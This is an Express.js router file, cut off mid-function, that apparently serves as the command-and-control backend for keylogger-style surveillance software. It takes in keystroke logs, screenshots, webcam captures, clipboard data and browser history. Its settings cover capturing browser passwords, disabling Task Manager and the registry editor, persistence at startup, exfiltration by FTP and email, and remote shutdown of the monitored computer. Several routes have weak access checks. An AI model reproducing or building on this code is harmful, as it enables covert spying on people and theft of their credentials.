var express = require('express');
var router = express.Router();
var bodyParser = require('body-parser')
var passport = require('passport');
var flash = require('connect-flash');
var multer = require('multer');
var session = require('express-session');
var request = require('request');
var ExifImage = require('exif').ExifImage;
var fs = require('fs');

var modelAlert = require('../model/modelAlert')
var modelEmail = require('../model/modelEmail')
var modelFTP = require('../model/modelFTP')
var modelGeneral = require('../model/modelGeneral')
var modelScreenshot = require('../model/modelScreenshot')
var modelTarget = require('../model/modelTarget')
var modelUser = require('../model/modelUser')
var modelWebcam = require('../model/modelWebcam')
var modelKeywordAlert = require('../model/modelKeywordAlert')
var modelKeywordTarget = require('../model/modelKeywordTarget')
var modelFindScreenshot = require('../model/modelFindScreenshot')
var modelFindWebcam = require('../model/modelFindWebcam')
var modelFindClipboardImage = require('../model/modelFindClipboardImage')
var modelFindClipboardLog = require('../model/modelFindClipboardLog')
var modelAvatar = require('../model/modelAvatar')
var modelLogin = require('../model/modelLogin')
var modelWeb = require('../model/modelWeb')
var modelFindWebLog = require('../model/modelFindWebLog')
var modelFindKeystroke = require('../model/modelFindKeystroke')
var modelKeywordUser = require('../model/modelKeywordUser')
var modelRemote = require('../model/modelRemote')

var gMessageSave = '';
var gMessageAdd = '';
var gMessageDel = '';

var storageWebLog = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/web/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageWebcam = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/images/webcam/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageScreenshot = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/images/screenshot/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageClipboardImage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/images/clipboard/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageClipboardLog = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/logs/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageKeystroke = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/keystroke/')
    },
    filename: function (req, file, cb) {
        cb(null, file.originalname)
    }
})

var storageAvatar = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public/images/avatar/')
    },
    filename: function (req, file, cb) {
        var path = 'images/avatar/' + 'avatar-' + req.session.user + '.jpeg';
        var avatar = {
            user: req.session.user,
            path: path
        }
        modelAvatar.findOneAndUpdate({ user: req.session.user }, avatar, err => {
            if (err) console.log(err);
            cb(null, 'avatar-' + req.session.user + '.jpeg');
        })
    }
})

function getFileExtension(filename) {
    var ext = /^.+\.([^.]+)$/.exec(filename);
    return ext == null ? "" : ext[1];
}

var uploadWebLog = multer({
    limits: { fileSize: 1000000 },
    storage: storageWebLog
})

var uploadKeystroke = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'txt')
            return cb(new Error('Only txt is allowed'))
        cb(null, true)
    },
    storage: storageKeystroke
})

var uploadWebcam = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'jpeg')
            return cb(new Error('Only jpeg is allowed'))
        cb(null, true)
    },
    storage: storageWebcam
})
var uploadScreenshot = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'jpeg')
            return cb(new Error('Only jpeg is allowed'))
        cb(null, true)
    },
    storage: storageScreenshot
})
var uploadClipboardImage = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'jpeg')
            return cb(new Error('Only jpeg is allowed'))
        cb(null, true)
    },
    storage: storageClipboardImage
})
var uploadClipboardLog = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'txt')
            return cb(new Error('Only txt is allowed'))
        cb(null, true)
    },
    storage: storageClipboardLog
})



var uploadAvatar = multer({
    limits: { fileSize: 1000000 },
    fileFilter: function (req, file, cb) {
        var type = getFileExtension(file.originalname);
        if (type !== 'jpg')
            return cb(new Error('Only jpg is allowed'))
        cb(null, true)
    },
    storage: storageAvatar
})

router.post('/logginUpload', isLogginUpload, function (req, res, next) {
    res.end();
})

router.post('/signupUpload', isSignupUpload, function (req, res, next) {
    res.end();
})


router.post('/login', captchaVerification, passport.authenticate('local-login', {
    successRedirect: '/general',
    failureRedirect: '/',
    failureFlash: true
}));

router.get('/', function (req, res, next) {
    res.render('login', { message: req.flash('loginMessage'), avatar: 'images/avatar/avatar.jpg' });
});

router.post('/sign-up', captchaVerification, passport.authenticate('local-signup', {
    successRedirect: '/general',
    failureRedirect: '/sign-up',
    failureFlash: true
}));

router.get('/sign-up', function (req, res, next) {
    res.render('signup', { message: req.flash('signupMessage'), avatar: 'images/avatar/avatar.jpg' });
})

router.get('/log-out', function (req, res) {
    req.logout();
    req.session.destroy();
    res.redirect('/');
})

router.get('/screenshot', isLoggedIn, function (req, res, next) {
    modelScreenshot.findOne({ name: 'screenshot', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        if (data === null)
            data = {
                name: '',
                user: '',
                enableScreenshot: false,
                hoursScreenshot: '',
                minutesScreenshot: '',
                enableTimestamp: false,
                enableDouble: false,
                enableDelete: false,
                deleteScreenshot: '',
                qualityScreenshot: ''
            }
        var messageSave = '';
        if (gMessageSave.length > 0) {
            messageSave = gMessageSave;
            gMessageSave = '';
        }
        modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
            if (err) console.log(err);
            res.render('screenshot', { data: data, avatar: avatar.path, messageSave: messageSave });
        })
    })
})

router.get('/general', isLoggedIn, function (req, res, next) {
    if (req.session.user === undefined)
        req.session.user = req.flash('user')[0];

    modelGeneral.findOne({ name: 'general', user: req.session.user || req.flash('user')[0] }, function (err, data) {
        if (err) console.log(err);
        if (data === null)
            data = {
                name: false,
                user: false,
                disableTaskManager: false,
                disableRegistry: false,
                enableEncrypt: false,
                enableStartup: false,
                enableHotkey: false,
                hotkeyGeneral: ''
            }
        var messageSignup = req.flash('signupMessage');
        var messageLogin = req.flash('loginMessage');
        var list = [];
        modelFindKeystroke.find({ user: req.session.user }, (err, log) => {
            if (log !== []) {
                log.forEach(element => {
                    var item = {
                        time: element.time,
                        color: element.color,
                        css: element.css,
                        content: element.content
                    }
                    list.push(item);
                })
                var messageSave = '';
                if (gMessageSave.length > 0) {
                    messageSave = gMessageSave;
                    gMessageSave = '';
                }
                modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                    if (err) console.log(err);
                    res.render('general', { list: list, data: data, messageSignup: messageSignup, messageLogin: messageLogin, messageSave: messageSave, avatar: avatar.path });
                })
            } else {
                var messageSave = '';
                if (gMessageSave.length > 0) {
                    messageSave = gMessageSave;
                    gMessageSave = '';
                }
                modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                    if (err) console.log(err);
                    res.render('general', { list: [], data: data, messageSignup: messageSignup, messageLogin: messageLogin, messageSave: messageSave, avatar: avatar.path });
                })
            }
        })

    })
})

router.get('/email', isLoggedIn, function (req, res, next) {
    modelEmail.findOne({ name: 'email', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        if (data === null)
            data = {
                name: '',
                user: '',
                hoursEmail: '',
                minutesEmail: '',
                limitEmail: '',
                passwordZipEmail: '',
                smtpEmail: '',
                userEmail: '',
                passwordEmail: '',
                subjectEmail: '',
                portEmail: '',
                enableEmail: false,
                enableUploadKeystroke: false,
                enableUploadImage: false,
                enableUploadWebcam: false,
                enableUploadWebsite: false,
                enableLimit: false,
                enableClear: false,
                enableZip: false,
                sendTo: ''
            }
        var messageSave = '';
        if (gMessageSave.length > 0) {
            messageSave = gMessageSave;
            gMessageSave = '';
        }
        modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
            if (err) console.log(err);
            res.render('email', { data: data, avatar: avatar.path, messageSave: messageSave });
        })
    })
})

router.get('/ftp', isLoggedIn, function (req, res, next) {
    modelFTP.findOne({ name: 'ftp', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        if (data === null)
            data = {
                name: '',
                user: '',
                enableFTP: false,
                hoursFTP: '',
                minutesFTP: '',
                enableUploadKeystroke: false,
                enableUploadImage: false,
                enableUploadWebcam: false,
                enableUploadWebsite: false,
                enableLimit: false,
                limitFTP: '',
                enableClear: false,
                enablePassive: false,
                hostnameFTP: '',
                userFTP: '',
                passwordFTP: '',
                remoteDirFTP: ''
            }
        var messageSave = '';
        if (gMessageSave.length > 0) {
            messageSave = gMessageSave;
            gMessageSave = '';
        }
        modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
            if (err) console.log(err);
            res.render('ftp', { data: data, avatar: avatar.path, messageSave: messageSave });

        })
    })
})

router.get('/webcam', isLoggedIn, function (req, res, next) {
    modelWebcam.findOne({ name: 'webcam', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        if (data === null)
            data = {
                name: '',
                user: '',
                enableWebcam: false,
                hoursWebcam: '',
                minutesWebcam: '',
                enableDelete: false,
                daysWebcam: '',
                enableDeleteUpload: false
            }
        var messageSave = '';
        if (gMessageSave.length > 0) {
            messageSave = gMessageSave;
            gMessageSave = '';
        }
        modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
            if (err) console.log(err);
            res.render('webcam', { data: data, avatar: avatar.path, messageSave: messageSave });
        })
    })
})

router.get('/user', isLoggedIn, function (req, res, next) {
    modelUser.findOne({ name: 'user', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        modelKeywordUser.findOne({ name: 'keywordUser', user: req.session.user }, function (err, list) {
            if (err) console.log(err);
            if (data === null)
                data = {
                    name: '',
                    user: '',
                    enableAll: false,
                    enableCurrent: false,
		    enableFollowing: false
                }
            if (list === null)
                list = {
                    list: []
                }
            var messageSave = '';
            if (gMessageSave.length > 0) {
                messageSave = gMessageSave;
                gMessageSave = '';
            }
            var messageAdd = '';
            if (gMessageAdd.length > 0) {
                messageAdd = gMessageAdd;
                gMessageAdd = '';
            }
            var messageDel = '';
            if (gMessageDel.length > 0) {
                messageDel = gMessageDel;
                gMessageDel = '';
            }
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                res.render('user', { data: data, avatar: avatar.path, messageSave: messageSave, list: list.list })
            })
        })
    })
})

router.get('/alert', isLoggedIn, function (req, res, next) {
    modelAlert.findOne({ name: 'alert', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        modelKeywordAlert.findOne({ name: 'keywordAlert', user: req.session.user }, function (err, list) {
            if (err) console.log(err);
            if (data === null)
                data = {
                    name: '',
                    user: '',
                    enableEmail: false,
                    enableScreenshot: false
                }
            if (list === null)
                list = {
                    list: []
                }
            var messageSave = '';
            if (gMessageSave.length > 0) {
                messageSave = gMessageSave;
                gMessageSave = '';
            }
            var messageAdd = '';
            if (gMessageAdd.length > 0) {
                messageAdd = gMessageAdd;
                gMessageAdd = '';
            }
            var messageDel = '';
            if (gMessageDel.length > 0) {
                messageDel = gMessageDel;
                gMessageDel = '';
            }
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                res.render('alert', { data: data, list: list.list, avatar: avatar.path, messageSave: messageSave, messageAdd: messageAdd, messageDel: messageDel });
            })
        })
    })
})

router.get('/clipboard', isLoggedIn, function (req, res, next) {
    var list = [];
    modelFindClipboardLog.find({ user: req.session.user }, (err, data) => {
        if (data !== []) {
            data.forEach(element => {
                var item = {
                    time: element.time,
                    color: element.color,
                    css: element.css,
                    content: element.content
                }
                list.push(item);
            })
            var messageSave = '';
            if (gMessageSave.length > 0) {
                messageSave = gMessageSave;
                gMessageSave = '';
            }
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                res.render('clipboard', { list: list, avatar: avatar.path, messageSave: messageSave });
            })
        } else {
            var messageSave = '';
            if (gMessageSave.length > 0) {
                messageSave = gMessageSave;
                gMessageSave = '';
            }
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                res.render('clipboard', { list: [], avatar: avatar.path, messageSave: messageSave });
            })
        }

    })
})


router.get('/target', isLoggedIn, function (req, res, next) {
    modelTarget.findOne({ name: 'target', user: req.session.user }, function (err, data) {
        if (err) console.log(err);
        modelKeywordTarget.findOne({ name: 'keywordTarget', user: req.session.user }, function (err, list) {
            if (err) console.log(err);
            if (data === null)
                data = {
                    name: '',
                    user: '',
                    enableAll: false,
                    enableOnly: false
                }
            if (list === null) {
                list = {
                    application: [],
                    title: []
                }
            }
            var messageSave = '';
            if (gMessageSave.length > 0) {
                messageSave = gMessageSave;
                gMessageSave = '';
            }
            var messageAdd = '';
            if (gMessageAdd.length > 0) {
                messageAdd = gMessageAdd;
                gMessageAdd = '';
            }
            var messageDel = '';
            if (gMessageDel.length > 0) {
                messageDel = gMessageDel;
                gMessageDel = '';
            }
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                res.render('target', { data: data, application: list.application, title: list.title, avatar: avatar.path, messageSave: messageSave, messageAdd: messageAdd, messageDel: messageDel })
            })
        })
    })
})


router.get('/web-usage', isLoggedIn, function (req, res, next) {
    var list = [];
    modelFindWebLog.find({ user: req.session.user }, (err, tmplist) => {
        if (tmplist !== []) {
            tmplist.forEach(element => {
                var item = {
                    time: element.time,
                    color: element.color,
                    css: element.css,
                    content: element.content
                }
                list.push(item);
            })
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                modelWeb.findOne({ name: 'web', user: req.session.user }, function (err, data) {
                    if (err) console.log(err);
                    if (data === null)
                        data = {
                            name: '',
                            user: '',
                            enable: false,
                            bookmark: false,
                            password: false
                        }
                    var messageSave = '';
                    if (gMessageSave.length > 0) {
                        messageSave = gMessageSave;
                        gMessageSave = '';
                    }
                    var today = new Date();
                    var dd = today.getDate() < 10 ? '0' + today.getDate() : today.getDate();
                    var mm = (today.getMonth() + 1) < 10 ? ('0' + (today.getMonth() + 1)) : (today.getMonth() + 1);
                    var yyyy = today.getFullYear();
                    var time = yyyy + '-' + mm + '-' + dd;
                    var resultHistory = [];
                    modelFindWebLog.findOne({ time: time, user: req.session.user, name: 'history' }, function (err, history) {
                        if (history !== null) {
                            var array = fs.readFileSync('public/' + history.content).toString().split('\n');
                            	for (let i = 0; i < 10; i++) {
                                	let temp = array[i].replace('\t', ' ');
                                	let temp2 = temp.split(' ');
                                	temp2[1] = temp2[1].replace('\r', '');
                                	temp2[1] = parseInt(temp2[1]);
                                	resultHistory.push(temp2)
                            	
			    }
                        }
                        res.render('web', { list: list, avatar: avatar.path, data: data, messageSave: messageSave, result: resultHistory });
                    })
                })
            })
        } else {
            modelAvatar.findOne({ user: req.session.user }, (err, avatar) => {
                if (err) console.log(err);
                modelWeb.findOne({ name: 'web', user: req.session.user }, function (err, data) {
                    if (err) console.log(err);
                    if (data === null)
                        data = {
                            name: '',
                            user: '',
                            enable: false,
                            bookmark: false,
                            password: false
                        }
                    var messageSave = '';
                    if (gMessageSave.length > 0) {
                        messageSave = gMessageSave;
                        gMessageSave = '';
                    }
                    var today = new Date();
                    var dd = today.getDate() < 10 ? '0' + today.getDate() : today.getDate();
                    var mm = (today.getMonth() + 1) < 10 ? ('0' + (today.getMonth() + 1)) : (today.getMonth() + 1);
                    var yyyy = today.getFullYear();
                    var time = yyyy + '-' + mm + '-' + dd;
                    var resultHistory = [];
                    modelFindWebLog.findOne({ time: time, user: req.session.user, name: 'history' }, function (err, history) {
                        var array = fs.readFileSync('public/' + history.content).toString().split('\n');
                        	for (let i = 0; i < 10; i++) {
                            		let temp = array[i].replace('\t', ' ');
                            		let temp2 = temp.split(' ');
                            		temp2[1] = temp2[1].replace('\r', '');
                            		temp2[1] = parseInt(temp2[1]);
                            		resultHistory.push(temp2)
                       		 }

			
                        res.render('web', { list: [], avatar: avatar.path, data: data, messageSave: messageSave, result: resultHistory });
                    })
                })
            })
        }

    })
})

router.get('/remote', isLoggedIn, function(req, res, next){
    modelAvatar.findOne({user : req.session.user}, (err, avatar) => {
        if (err) console.log(err);
        res.render('remote', {avatar : avatar.path})
    })
})

router.post('/remote-method', function (req, res, next) {
	console.log(req.body);
    modelLogin.findById(req.body.token, function (err, user) {
        if (user === null)
            res.send('User not found');
        else {
            modelRemote.findOne({ user: req.body.email }, function (err, remote) {
                if (remote !== null && remote !== undefined) {
                    if (err) console.log(err);
                    var method = remote.method;
                    modelRemote.findOneAndUpdate({ user: req.body.email }, { method: 'none' }, function (err) {})
		    if (req.body.mode === '0') 
                        res.send(method);
		    else 
			res.send('none');
                } else {
                    res.send('Not found');
                }
            })
        }
    })
})

router.get('/view-screenshot/:date', isLoggedIn, function (req, res, next) {
	console.log('1');
    var date = req.params.date;
    modelFindScreenshot.findOne({ date: date, user: req.session.user }, (err, data) => {
        if (err) console.log(err);
	console.log(data);
        if (data !== null) {
            res.send(data.time);
        }
        else {
            res.send([]);
        }
    })
})

router.get('/view-webcam/:date', isLoggedIn, function (req, res, next) {
    var date = req.params.date;
    modelFindWebcam.findOne({ date: date, user: req.session.user }, (err, data) => {
        if (err) console.log(err);
        if (data !== null) {
            res.send(data.time);
        }
        else {
            res.send([]);
        }
    })
})


router.get('/view-clipboard-image/:date', isLoggedIn, function (req, res, next) {
    var date = req.params.date;
    modelFindClipboardImage.findOne({ date: date, user: req.session.user }, (err, data) => {
        if (err) console.log(err);
        if (data !== null)
            res.send(data.time);
        else
            res.send([]);
    })
})

router.post('/check-day-screenshot', isLoggedIn, function (req, res, next) {
    var range = req.body.screenshot;
    range = range.split(' - ');
    var tmpFirstDay = range[0];
    var tmpSecondDay = range[1];
    tmpFirstDay = tmpFirstDay.split('/');
    tmpSecondDay = tmpSecondDay.split('/');
    var firstDay = new Date(tmpFirstDay[2], tmpFirstDay[0], tmpFirstDay[1], 0, 0, 0, 0);
    var secondDay = new Date(tmpSecondDay[2], tmpSecondDay[0], tmpSecondDay[1], 0, 0, 0, 0);
    var result = [];
    modelFindScreenshot.find({}, function (err, screenshot) {
        screenshot.forEach(elm => {
            let date = elm.date;
            date = date.split('-');
            let compare = new Date(date[0], date[1], date[2], 0, 0, 0, 0);
            if (compare.getTime() >= firstDay.getTime() && compare.getTime() <= secondDay.getTime()) {
                let item = {
                    start: elm.date
                }
                result.push(item);
            }
        })
        result = JSON.stringify(result);
        res.cookie('screenshot', result);
        res.redirect('/screenshot');
    })
})

router.post('/check-day-webcam', isLoggedIn, function (req, res, next) {
    var range = req.body.webcam;
    range = range.split(' - ');
    var tmpFirstDay = range[0];
    var tmpSecondDay = range[1];
    tmpFirstDay = tmpFirstDay.split('/');
    tmpSecondDay = tmpSecondDay.split('/');
    var firstDay = new Date(tmpFirstDay[2], tmpFirstDay[0], tmpFirstDay[1], 0, 0, 0, 0);
    var secondDay = new Date(tmpSecondDay[2], tmpSecondDay[0], tmpSecondDay[1], 0, 0, 0, 0);
    var result = [];
    modelFindWebcam.find({}, function (err, webcam) {
        webcam.forEach(elm => {
            let date = elm.date;
            date = date.split('-');
            let compare = new Date(date[0], date[1], date[2], 0, 0, 0, 0);
            if (compare.getTime() >= firstDay.getTime() && compare.getTime() <= secondDay.getTime()) {
                let item = {
                    start: elm.date
                }
                result.push(item);
            }
        })
        result = JSON.stringify(result);
        res.cookie('webcam', result);
        res.redirect('/webcam');
    })
})

router.post('/check-day-clipboard', isLoggedIn, function (req, res, next) {
    var range = req.body.clipboard;
    range = range.split(' - ');
    var tmpFirstDay = range[0];
    var tmpSecondDay = range[1];
    tmpFirstDay = tmpFirstDay.split('/');
    tmpSecondDay = tmpSecondDay.split('/');
    var firstDay = new Date(tmpFirstDay[2], tmpFirstDay[0], tmpFirstDay[1], 0, 0, 0, 0);
    var secondDay = new Date(tmpSecondDay[2], tmpSecondDay[0], tmpSecondDay[1], 0, 0, 0, 0);
    var result = [];
    modelFindClipboardImage.find({}, function (err, clipboard) {
        clipboard.forEach(elm => {
            let date = elm.date;
            date = date.split('-');
            let compare = new Date(date[0], date[1], date[2], 0, 0, 0, 0);
            if (compare.getTime() >= firstDay.getTime() && compare.getTime() <= secondDay.getTime()) {
                let item = {
                    start: elm.date
                }
                result.push(item);
            }
        })
        result = JSON.stringify(result);
        res.cookie('clipboard', result);
        res.redirect('/clipboard');
    })
})

router.post('/remote', isLoggedIn, function(req, res, next) {
    var method = ''
    switch(req.body.remote) {
        case 'Shutdown':
            method = 'shutdown';
            break;
        case 'Restart':
            method = 'restart';
            break;
        case 'Sleep':
            method = 'sleep';
            break;
        case 'Log off':
            method = 'logoff';
            break;
    }
    var remote = {
        user : req.session.user,
        method : method
    }
    modelRemote.findOneAndUpdate({user : req.session.user}, remote, {upsert : true}, function(err, remote){
        if (err) console.log(err);
        res.redirect('/remote');
    })
})
router.post('/alert', isLoggedIn, function (req, res, next) {
    var alert = {
        name: 'alert',
        user: req.session.user,
        enableEmail: req.body.enableEmail === 'on' ? true : false,
        enableScreenshot: req.body.enableScreenshot === 'on' ? true : false
    }

    modelAlert.findOneAndUpdate({ name: 'alert', user: req.session.user }, alert, { upsert: true }, (err, data) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/alert');
    })
})

router.post('/email', isLoggedIn, function (req, res, next) {
    var email = {
        name: 'email',
        user: req.session.user,
        hoursEmail: req.body.hoursEmail,
        minutesEmail: req.body.minutesEmail,
        limitEmail: req.body.limitEmail,
        passwordZipEmail: req.body.passwordZipEmail,
        smtpEmail: req.body.smtpEmail,
        userEmail: req.body.userEmail,
        passwordEmail: req.body.passwordEmail,
        subjectEmail: req.body.subjectEmail,
        portEmail: req.body.portEmail,
        sendTo: req.body.sendTo,
        enableEmail: req.body.enableEmail === 'on' ? true : false,
        enableUploadKeystroke: req.body.enableUploadKeystroke === 'on' ? true : false,
        enableUploadImage: req.body.enableUploadImage === 'on' ? true : false,
        enableUploadWebcam: req.body.enableUploadWebcam === 'on' ? true : false,
        enableUploadWebsite: req.body.enableUploadWebsite === 'on' ? true : false,
        enableLimit: req.body.enableLimit === 'on' ? true : false,
        enableClear: req.body.enableClear === 'on' ? true : false,
        enableZip: req.body.enableZip === 'on' ? true : false
    }

    modelEmail.findOneAndUpdate({ name: 'email', user: req.session.user }, email, { upsert: true }, (err) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/email');
    })
})

router.post('/ftp', isLoggedIn, function (req, res, next) {
    var ftp = {
        name: "ftp",
        user: req.session.user,
        enableFTP: req.body.enableFTP === 'on' ? true : false,
        hoursFTP: req.body.hoursFTP,
        minutesFTP: req.body.minutesFTP,
        enableUploadKeystroke: req.body.enableUploadKeystroke === 'on' ? true : false,
        enableUploadImage: req.body.enableUploadImage === 'on' ? true : false,
        enableUploadWebcam: req.body.enableUploadWebcam === 'on' ? true : false,
        enableUploadWebsite: req.body.enableUploadWebsite === 'on' ? true : false,
        enableLimit: req.body.enableLimit === 'on' ? true : false,
        limitFTP: req.body.limitFTP,
        enableClear: req.body.enableClear === 'on' ? true : false,
        enablePassive: req.body.enablePassive === 'on' ? true : false,
        hostnameFTP: req.body.hostnameFTP,
        userFTP: req.body.userFTP,
        passwordFTP: req.body.passwordFTP,
        remoteDirFTP: req.body.remoteDirFTP
    }

    modelFTP.findOneAndUpdate({ name: 'ftp', user: req.session.user }, ftp, { upsert: true }, (err) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/ftp');
    })
})

router.post('/general', isLoggedIn, function (req, res, next) {
    var general = {
        name: 'general',
        user: req.session.user,
        disableTaskManager: req.body.disableTaskManager === 'on' ? true : false,
        disableRegistry: req.body.disableRegistry === 'on' ? true : false,
        enableEncrypt: req.body.enableEncrypt === 'on' ? true : false,
        enableStartup: req.body.enableStartup === 'on' ? true : false,
        enableHotkey: req.body.enableHotkey === 'on' ? true : false,
        hotkeyGeneral: req.body.hotkeyGeneral
    }

    modelGeneral.findOneAndUpdate({ name: 'general', user: req.session.user }, general, { upsert: true }, (err) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/general')
    })
})

router.post('/screenshot', isLoggedIn, function (req, res, next) {
    var screenshot = {
        name: 'screenshot',
        user: req.session.user,
        enableScreenshot: req.body.enableScreenshot === 'on' ? true : false,
        hoursScreenshot: req.body.hoursScreenshot,
        minutesScreenshot: req.body.minutesScreenshot,
        enableTimestamp: req.body.enableTimestamp === 'on' ? true : false,
        enableDouble: req.body.enableDouble === 'on' ? true : false,
        enableDelete: req.body.enableDelete === 'on' ? true : false,
        deleteScreenshot: req.body.deleteScreenshot,
        qualityScreenshot: req.body.qualityScreenshot,
        dateDelete: req.body.dateDelete
    }

    modelScreenshot.findOneAndUpdate({ name: 'screenshot', user: req.session.user }, screenshot, { upsert: true }, (err) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/screenshot')
    })
})

router.post('/target', isLoggedIn, function (req, res, next) {
    var target = {
        name: 'target',
        user: req.session.user,
        enableAll: req.body.enableAll === 'on' ? true : false,
        enableOnly: req.body.enableOnly === 'on' ? true : false
    }

    modelTarget.findOneAndUpdate({ name: 'target', user: req.session.user }, target, { upsert: true }, (err) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/target');
    })
})

router.post('/user', isLoggedIn, function (req, res, next) {
    var user = {
        name: 'user',
        user: req.session.user,
        enableAll: req.body.enableAll === 'on' ? true : false,
        enableCurrent: req.body.enableCurrent === 'on' ? true : false,
        enableFollowing: req.body.enableFollowing === 'on' ? true : false
    }

    modelUser.findOneAndUpdate({ name: 'user', user: req.session.user }, user, { upsert: true }, (err, data) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/user');
    })
})

router.post('/webcam', isLoggedIn, function (req, res, next) {
    var webcam = {
        name: 'webcam',
        user: req.session.user,
        enableWebcam: req.body.enableWebcam === 'on' ? true : false,
        hoursWebcam: req.body.hoursWebcam,
        minutesWebcam: req.body.minutesWebcam,
        enableDelete: req.body.enableDelete === 'on' ? true : false,
        daysWebcam: req.body.daysWebcam,
        enableDeleteUpload: req.body.enableDeleteUpload === 'on' ? true : false,
        dateDelete: req.body.dateDelete
    }

    modelWebcam.findOneAndUpdate({ name: 'webcam', user: req.session.user }, webcam, { upsert: true }, (err, data) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/webcam');
    })
})

router.post('/web-usage', function (req, res, next) {
    var web = {
        name: 'web',
        user: req.session.user,
        enable: req.body.enable === 'on' ? true : false,
        bookmark: req.body.bookmark === 'on' ? true : false,
        password: req.body.password === 'on' ? true : false,
    }
    modelWeb.findOneAndUpdate({ name: 'web', user: req.session.user }, web, { upsert: true }, (err, data) => {
        if (err) console.log(err);
        gMessageSave = 'Saved successfully';
        res.redirect('/web-usage');
    })

})

function checkTokenSync(req, res, next) {
    var token = req.body.token;
    modelLogin.findById(token, function (err, user) {
        if (user === null)
            return res.send('User not found');
        else
            return next();
    })
}



router.post('/sync-settings-up', checkTokenSync, function (req, res, next) {
    var keywordAlert = req.body.keywordAlert;
    var keywordTarget = req.body.keywordTarget;
    var alert = req.body.alert;
    var email = req.body.email;
    var ftp = req.body.ftp;
    var general = req.body.general;
    var screenshot = req.body.screenshot;
    var target = req.body.target;
    var webcam = req.body.webcam;
    var web = req.body.web;
    var keywordUser = req.body.keywordUser;
    var user = req.body.user;
    modelKeywordAlert.findOneAndUpdate({ name: 'keywordAlert', user: req.body.monitor_user }, keywordAlert, { upsert: true }, err => {
        if (err) console.log(err);
        modelKeywordTarget.findOneAndUpdate({ name: 'keywordTarget', user: req.body.monitor_user }, keywordTarget, { upsert: true }, err => {
            if (err) console.log(err);
            modelAlert.findOneAndUpdate({ name: 'alert', user: req.body.monitor_user }, alert, { upsert: true }, err => {
                if (err) console.log(err);
                modelEmail.findOneAndUpdate({ name: 'email', user: req.body.monitor_user }, email, { upsert: true }, err => {
                    if (err) console.log(err);
                    modelFTP.findOneAndUpdate({ name: 'ftp', user: req.body.monitor_user }, ftp, { upsert: true }, err => {
                        if (err) console.log(err);
                        modelGeneral.findOneAndUpdate({ name: 'general', user: req.body.monitor_user }, general, { upsert: true }, err => {
                            if (err) console.log(err);
                            modelScreenshot.findOneAndUpdate({ name: 'screenshot', user: req.body.monitor_user }, screenshot, { upsert: true }, err => {
                                if (err) console.log(err);
                                modelTarget.findOneAndUpdate({ name: 'target', user: req.body.monitor_user }, target, { upsert: true }, err => {
                                    if (err) console.log(err);
                                    modelWebcam.findOneAndUpdate({ name: 'webcam', user: req.body.monitor_user }, webcam, { upsert: true }, err => {
                                        if (err) console.log(err);
                                        modelWeb.findOneAndUpdate({ name: 'web', user: req.body.monitor_user }, web, { upsert: true }, err => {
                                            if (err) console.log(err);
                                            modelKeywordUser.findOneAndUpdate({ name: 'keywordUser', user: req.body.monitor_user }, keywordUser, { upsert: true }, err => {
                                                if (err) console.log(err);
						modelUser.findOneAndUpdate({ name: 'user', user: req.body.monitor_user }, user, { upsert: true }, err => {
							if (err) console.log(err);
							res.end();
						})
                                            })
                                        })
                                    })
                                })
                            })
                        })
                    })
                })
            })
        })
    })
})

router.post('/sync-settings-down', checkTokenSync, function (req, res, next) {
    settings = {};
    modelAlert.findOne({ name: 'alert', user: req.body.user }, function (err, alert) {
        if (err) console.log(err);
        settings.alert = alert
        modelEmail.findOne({ name: 'email', user: req.body.user }, function (err, email) {
